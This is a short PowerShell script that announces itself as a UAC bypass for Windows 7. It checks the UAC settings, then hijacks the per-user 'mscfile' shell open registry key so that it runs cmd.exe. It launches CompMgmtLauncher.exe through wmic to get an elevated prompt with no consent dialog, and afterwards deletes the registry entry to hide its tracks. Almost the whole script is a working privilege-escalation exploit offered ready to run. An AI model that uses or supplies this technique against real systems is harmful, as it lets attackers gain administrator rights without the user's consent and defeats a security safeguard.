Write-Host "
 +-+-+-+-+ +-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+ 
 |W i n 7| |C o m p u t e r| |M a n a g e m e n t| 
 +-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 
               |U A C| |B y p a s s|               
               +-+-+-+ +-+-+-+-+-+-+               
"

echo "[*] Checking UAC status..."

$status = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
if ( $status -eq 1 )
    {echo "[+] UAC is enabled!"}


echo "[*] Checking current configuration..."

$config = ((reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System |Select-String "ConsentPromptBehaviorAdmin") -Split "x")[1]
if ($config -eq 2)
    {echo "[!] UAC is configured as Always Ask, forget about it."}
        else{Write-Host "[+] Good news, UAC is not hardened enough!"}


echo "[*] Checking compmgmtlauncher status..."

$launcher = (Get-ChildItem -Path C:\Windows\System32\ -Filter CompMgmtLauncher.exe)
if ($launcher -clike "*CompMgmtLauncher*"){
    echo "[+] The utility is installed on the system!"
}else{
    echo "[!] The utility is not installed on the system."
}


echo "[*] Adding registry entries..."

New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\" -Name command -Value "c:\windows\system32\cmd.exe" -Force | Out-Null


echo "[*] Executing the utility and registry cleanup..."


wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe"
Start-Sleep -s 5
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force | Out-Null